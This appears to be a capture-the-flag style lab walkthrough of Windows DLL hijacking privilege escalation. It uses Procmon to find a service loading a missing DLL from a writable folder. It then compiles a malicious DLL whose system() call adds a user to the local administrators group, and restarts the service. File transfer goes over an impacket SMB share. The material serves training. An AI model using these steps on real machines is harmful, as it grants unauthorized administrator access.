**Detection**

Windows VM

1. Open the Tools folder that is located on the desktop and then go the Process Monitor folder.  
2. In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on Procmon.exe and select ‘Run as administrator’ from the menu.  
   
   ![[Pasted image 20240207193604.png]]
3. In procmon, select "filter".  From the left-most drop down menu, select ‘Process Name’.  
   
   ![[Pasted image 20240207193706.png]]
   
1. In the input box on the same line type: 
   
```
dllhijackservice.exe
```

5. Make sure the line reads “Process Name is dllhijackservice.exe then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.  
6. Next, select from the left-most drop down menu ‘Result’.  
7. In the input box on the same line type: 
   
```
NAME NOT FOUND
```

8. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.  
   
   ![[Pasted image 20240207193919.png]]
   
9. Open command prompt and type: 
   
```
sc start dllsvc
```
  
  ![[Pasted image 20240207194013.png]]
  
10. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute ‘C:\Temp\hijackme.dll’ yet it could not do that as the file was not found. Note that ‘C:\Temp’ is a writable location.
    
![[Pasted image 20240207194258.png]]


**Exploitation**

Windows VM

1. Copy ‘C:\Users\User\Desktop\Tools\Source\windows_dll.c’ to the Kali VM.
   
   *On Kali*:
	- Open server:
```
python3 /opt/impacket/examples/smbserver.py -smb2support myshare2 .
```

*On Windows*:

	- From the Windows Command Prompt

```
net use \\<IP to your Kali box>\myshare2
```

![[Pasted image 20240207202429.png]]

*Windows Explorer*:

To connect enter the IP address of your Kali box followed by the name of the share:

```
\\<Kali IP>\myshare2
```

![[Pasted image 20240207202543.png]]

Just drag the file you want to move from the first Explorer window to the Explorer Window connected to the share

Kali VM

1. Open windows_dll.c in a text editor and replace the command used by the system() function to: 

```
cmd.exe /k net localgroup administrators user /add
```
  
2. Exit the text editor and compile the file by typing the following in the command prompt:
 
```
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
```

3. Copy the generated file hijackme.dll, to the Windows VM.

Windows VM

1. Place hijackme.dll in ‘C:\Temp’.  
2. Open command prompt and type: **sc stop dllsvc & sc start dllsvc**  
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: **net localgroup administrators**

Answer the questions below

Click 'Completed' once you have successfully elevated the machine